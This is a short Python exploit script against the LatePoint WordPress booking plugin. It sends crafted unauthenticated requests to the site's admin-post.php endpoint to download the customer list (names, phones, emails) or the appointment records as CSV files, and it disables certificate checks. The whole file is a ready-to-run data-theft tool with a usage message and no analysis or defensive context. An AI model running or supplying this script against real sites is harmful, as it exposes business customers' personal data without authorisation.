import requests
import sys
import os

USAGE_MESSAGE = "Usage: python latepoint_exploit.py example.com:80 customers/appointments"
try:
	HOST = sys.argv[1]
except IndexError:
	print(USAGE_MESSAGE)
	exit(-1)

def getCustomersCSV(HOST):
	PAYLOAD = f"""http://{HOST}/wp-admin/admin-post.php?action=latepoint_route_call&route_name=customers__index&filter%5Bid%5D=&filter%5Bcustomer%5D=&filter%5Bphone%5D=&filter%5Bemail%5D=&filter%5Bregistration_date_from%5D=&filter%5Bregistration_date_to%5D=&download=csv&filter%5Bid%5D=&filter%5Bcustomer%5D=&filter%5Bphone%5D=&filter%5Bemail%5D=&filter%5Bregistration_date_from%5D=&filter%5Bregistration_date_to%5D=&download=csv"""
	r = requests.get(PAYLOAD,verify=False)
	file = open("customers.csv","w")
	file.write(r.text)

def getAppointmentsCSV(HOST):
	PAYLOAD = f"""http://{HOST}/wp-admin/admin-post.php?action=latepoint_route_call&route_name=bookings__index&filter%5Bid%5D=&filter%5Bservice_id%5D=&filter%5Bbooking_date_from%5D=&filter%5Bbooking_date_to%5D=&filter%5Bagent_id%5D=&filter%5Bcustomer%5D=&filter%5Bstatus%5D=&filter%5Bcreated_date_from%5D=&filter%5Bcreated_date_to%5D=&download=csv"""
	r = requests.get(PAYLOAD,verify=False)
	file = open("appointments.csv","w")
	file.write(r.text)

try:
	if sys.argv[2] == "customers":
		getCustomersCSV(HOST)
	elif sys.argv[2] == "appointments":
		getAppointmentsCSV(HOST)
except IndexError:
	print(USAGE_MESSAGE)
